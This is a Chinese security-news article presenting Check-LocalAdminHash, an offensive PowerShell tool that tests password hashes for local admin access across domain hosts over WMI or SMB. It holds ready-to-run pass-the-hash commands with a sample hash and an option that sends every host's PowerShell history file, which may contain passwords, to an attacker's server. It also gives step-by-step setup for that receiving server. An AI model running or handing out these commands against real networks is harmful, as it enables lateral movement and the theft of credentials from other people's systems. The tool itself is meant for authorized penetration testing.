![](https://image.3001.net/images/20200205/1580910308_5e3ac6e4ea64c.jpg!small)

## Check-LocalAdminHash

 **Check-LocalAdminHash是一款基于PowerShell开发的工具，它可以尝试通过WMI或SMB来对多台主机进行身份验证，并通过密码哈希来判断用户提供的凭证是否属于本地管理员账户。**

如果你获取到了一个用户账户的密码，并且需要判断该用户账户是否为目标网络系统中的本地管理员账户时，Check-LocalAdminHash就派上用场了。值得一提的是，该工具还集成了两个第三方工具，即Invoke-TheHash（用于凭证检测）和PowerView的脚本工具模块（用于枚举域名计算机）。

![](https://image.3001.net/images/20200205/1580910330_5e3ac6fa7d51c.png!small)

我之所以开发这款工具，是因为在一次信息收集活动中，我需要收集目标网络中所有系统的PowerShell命令行历史文件（PSReadline），而PSReadline命令行历史记录实际上就是PowerShell版本的Bash记录。这种记录中包含了非常多有意思的内容，其中就包括用户在终端中输入过的密码。因此，Check-LocalAdminHash还提供了一个选项来帮助用户筛选和过滤所有的PSReadline文件。

### 工具下载

广大研究人员可以使用下列命令将项目源码克隆至本地：

    
    
    git clone https://github.com/dafthack/Check-LocalAdminHash.git

## 工具使用样例

### 通过WMI检测所有主机的本地管理员哈希

下面这条命令将使用域名“testdomain.local”来查询所有的主机系统，然后尝试通过WMI并是使用用户“testdomain.local\PossibleAdminUser”以及密码哈希来验证凭证的有效性：

`Check-LocalAdminHash -Domain testdomain.local -UserDomain testdomain.local
-Username PossibleAdminUser -PasswordHash E62830DAED8DBEA4ACD0B99D682946BB
-AllSystems`

### 提取所有的PSReadline终端历史记录

下面这条命令将使用域名“testdomain.local”来查询所有的主机系统，然后尝试通过WMI并是使用用户“testdomain.local\PossibleAdminUser”以及密码哈希来验证凭证的有效性。接下来，它会尝试定位目标网络中每一个系统的PowerShell终端历史记录文件（PSReadline），然后使用POST将它们发送至我们的Web服务器：

`Check-LocalAdminHash -Domain testdomain.local -UserDomain testdomain.local
-Username PossibleAdminUser -PasswordHash E62830DAED8DBEA4ACD0B99D682946BB
-AllSystems -ExfilPSReadline`

### 使用CIDR

下面这条命令将使用工具提供的CIDR范围来生成一个目标列表，然后尝试通过WMI并使用本地用户“PossibleAdminUser”和密码哈希来验证用户凭证：

    
    
    Check-LocalAdminHash -Username PossibleAdminUser -PasswordHash E62830DAED8DBEA4ACD0B99D682946BB -CIDR 192.168.1.0/24

### 使用目标列表和SMB并将结果输出至文件

下面这条命令将使用提供的目标列表，并尝试通过SMB和本地用户“PossibleAdminUser”以及密码哈希来验证用户凭证：

`Check-LocalAdminHash -Username PossibleAdminUser -PasswordHash
E62830DAED8DBEA4ACD0B99D682946BB -TargetList C:\temp\targetlist.txt -Protocol
SMB | Out-File -Encoding Ascii C:\temp\local-admin-systems.txt`

### 单一目标

下面这条命令针对的是主机系统“192.168.0.16”，它将通过SMB并使用用户名“Administrator ”来进行本地管理员账号验证：

    
    
    Check-LocalAdminHash -TargetSystem 192.168.0.16 -Username Administrator -PasswordHash E62830DAED8DBEA4ACD0B99D682946BB -Protocol SMB

### Check-LocalAdminHash选项：

    
    
    Username - The Username for attempting authentication.
    PasswordHash - Password hash of the user.
    TargetSystem - Single hostname or IP for authentication attempt.
    TargetList - A list of hosts to scan one per line
    AllSystems - A switch that when enabled utilizes PowerView modules to enumerate all domain systems. This list is then used to check local admin access.
    Domain - This is the domain that PowerView will utilize for discovering systems.
    UserDomain - This is the user's domain to authenticate to each system with. Don't use this flag if using a local cred instead of domain cred.
    Protocol - This is the setting for whether to check the hash using WMI or SMB. Default is 'WMI' but set it to 'SMB' to check that instead.
    CIDR - Specify a CIDR form network range such as 192.168.0.0/24
    Threads - Defaults to 5 threads. (I've run into some odd issues setting threads more than 15 with some results not coming back.)
    ExfilPSReadline - For each system where auth is successful it runs a PowerShell command to locate PSReadLine console history files (PowerShell command history) and then POSTS them to a web server. See the Readme for server setup. 

## PSReadline过滤配置

接下来，我们将需要设置一台对外接收文件上传的服务器。在开始之前，我建议大家先锁定好设备的防火墙规则，以及允许上传PSReadline文件的IP地址。

> 1、设置一台用于接收上传文件的服务器，这个服务器必须能够通过HTTP/HTTPS访问。
>
> 2、将本项目中的index.php脚本拷贝到Web服务器的根目录（“/var/www/html/index.php”）。
>
> 3、创建一个上传目录：
    
    
    mkdir /var/www/html/uploads

4、修改该目录的权限：

    
    
    chmod 0777 /var/www/html/uploads

5、安装好PHP环境：

    
    
    apt-get install php

6、重启Apache服务器：

    
    
    service apache2 restart

7、Check-LocalAdminHash.ps1脚本会跳转到“Gen-EncodedUploadScript”函数，并修改“$Url”变量，将其指向我们Web服务器的index.php页面。

接下来在你使用“-ExfilPSReadline”选项运行Check-LocalAdminHash时，它就会尝试使用POST来将所有发现的PSReadline文件发送至你的服务器端了。

![](https://image.3001.net/images/20200205/1580910388_5e3ac734b5a2a.png!small)

## 项目地址

Check-LocalAdminHash：【[ _GitHub传送门_](https://github.com/dafthack/Check-LocalAdminHash)】

## 参考资料

> 1、博客文章：[ _https://www.blackhillsinfosec.com/check-localadminhash-> exfiltrating-all-powershell-> history/_](https://www.blackhillsinfosec.com/check-localadminhash-> exfiltrating-all-powershell-history/)
>
> 2、Invoke-TheHash：[ _https://github.com/Kevin-Robertson/Invoke-> TheHash_](https://github.com/Kevin-Robertson/Invoke-TheHash)
>
> 3、PowerView：[
> _https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1_](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1)

 *** 参考来源：[ _dafthack_](https://github.com/dafthack/Check-LocalAdminHash)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

